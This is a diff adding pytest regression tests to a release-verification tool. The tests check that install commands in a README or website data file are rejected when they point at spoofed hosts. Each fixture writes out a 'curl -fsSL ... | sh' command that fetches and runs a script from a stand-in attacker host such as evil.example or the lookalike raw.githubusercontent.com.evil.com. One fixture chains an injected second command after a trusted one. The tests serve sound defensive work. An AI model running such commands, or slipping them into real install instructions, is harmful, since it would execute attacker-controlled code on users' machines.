@@ -7516,6 +7516,75 @@ def test_phase11_verify_readme_pin_catches_stale_pin_among_multiple(
     assert "✗ README pin" in out
 
 
+def test_phase11_verify_readme_pin_rejects_evil_host_with_trusted_string_in_path(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A URL carrying the trusted host string inside an attacker's PATH
+    must not be classified as trusted.
+
+    Regression for the authority-bypass gap: a bare substring/regex match
+    on "raw.githubusercontent.com/<owner>/<repo>/<sha>/install.sh" matches
+    that string wherever it appears — including inside the PATH of
+    https://evil.example/raw.githubusercontent.com/<owner>/<repo>/<sha>/
+    install.sh, which curl would download from evil.example, not GitHub.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    (root / "README.md").write_text(
+        "# proj\n\ncurl -fsSL "
+        "https://evil.example/raw.githubusercontent.com/punt-labs/proj/"
+        f"{install_sha}/install.sh | sh\n"
+    )
+    _git(["add", "README.md"], cwd=d)
+    _git(["commit", "-m", "pin readme to an authority-spoofed url"], cwd=d)
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ README pin" in out
+    assert "trusted" in out
+
+
+def test_phase11_verify_readme_pin_rejects_lookalike_host_suffix(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A hostname that merely ends with the trusted host must be rejected.
+
+    Regression for authority exactness: raw.githubusercontent.com.evil.com
+    is a distinct, attacker-controlled host — hostname comparison must be
+    exact, not endswith.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    (root / "README.md").write_text(
+        "# proj\n\ncurl -fsSL "
+        "https://raw.githubusercontent.com.evil.com/punt-labs/proj/"
+        f"{install_sha}/install.sh | sh\n"
+    )
+    _git(["add", "README.md"], cwd=d)
+    _git(["commit", "-m", "pin readme to a lookalike host"], cwd=d)
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ README pin" in out
+    assert "trusted" in out
+
+
 # --- Phase 11: matches_install_sha() commit-identity resolution ---
 
 
@@ -7829,6 +7898,139 @@ def test_phase11_verify_website_sha_fails_on_wrong_owner(
         _phase11_verify(info, version, dry_run=False)
 
     out = capsys.readouterr().out
+    assert "✗ website SHA" in out
+    assert "trusted" in out
+
+
+def test_phase11_verify_website_sha_rejects_evil_host_with_trusted_string_in_path(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A URL carrying the trusted host string inside an attacker's PATH
+    must not be classified as trusted for the website check either.
+
+    Regression for the authority-bypass gap: a bare substring/regex match
+    on "raw.githubusercontent.com/<owner>/<repo>/<sha>/install.sh" matches
+    that string wherever it appears — including inside the PATH of
+    https://evil.example/raw.githubusercontent.com/<owner>/<repo>/<sha>/
+    install.sh, which curl would download from evil.example, not GitHub.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    projects = [
+        {
+            "id": "proj",
+            "version": version,
+            "githubUrl": "https://github.com/punt-labs/proj",
+            "installCommand": (
+                "curl -fsSL https://evil.example/raw.githubusercontent.com/"
+                f"punt-labs/proj/{install_sha}/install.sh | sh"
+            ),
+        }
+    ]
+    _make_sibling(
+        tmp_path,
+        "public-website",
+        {"src/data/projects.json": json.dumps(projects, indent=2) + "\n"},
+    )
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ website SHA" in out
+    assert "trusted" in out
+
+
+def test_phase11_verify_website_sha_rejects_lookalike_host_suffix(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """Authority exactness: a hostname that merely ends with the trusted
+    host must be rejected, not accepted via endswith.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    projects = [
+        {
+            "id": "proj",
+            "version": version,
+            "githubUrl": "https://github.com/punt-labs/proj",
+            "installCommand": (
+                "curl -fsSL https://raw.githubusercontent.com.evil.com/"
+                f"punt-labs/proj/{install_sha}/install.sh | sh"
+            ),
+        }
+    ]
+    _make_sibling(
+        tmp_path,
+        "public-website",
+        {"src/data/projects.json": json.dumps(projects, indent=2) + "\n"},
+    )
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ website SHA" in out
+    assert "trusted" in out
+
+
+def test_phase11_verify_website_sha_fails_when_untrusted_pin_alongside_trusted(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """One trusted current-SHA URL PLUS one untrusted-host SHA-shaped URL
+    in the same installCommand must FAIL — the untrusted one is not
+    skipped just because a trusted pin was also found.
+
+    Regression for the trusted-match short-circuit: when trusted pins were
+    found, the branch that rejects untrusted SHA-shaped URLs never even
+    ran, so an installCommand could carry a legitimate current-SHA pin
+    alongside an injected untrusted one and pass after checking only the
+    trusted half.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    projects = [
+        {
+            "id": "proj",
+            "version": version,
+            "githubUrl": "https://github.com/punt-labs/proj",
+            "installCommand": (
+                "curl -fsSL https://raw.githubusercontent.com/punt-labs/proj/"
+                f"{install_sha}/install.sh | sh; "
+                "curl -fsSL https://evil.example/proj/"
+                f"{install_sha}/install.sh | sh"
+            ),
+        }
+    ]
+    _make_sibling(
+        tmp_path,
+        "public-website",
+        {"src/data/projects.json": json.dumps(projects, indent=2) + "\n"},
+    )
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✓ website SHA" in out
     assert "✗ website SHA" in out
     assert "trusted" in out
 
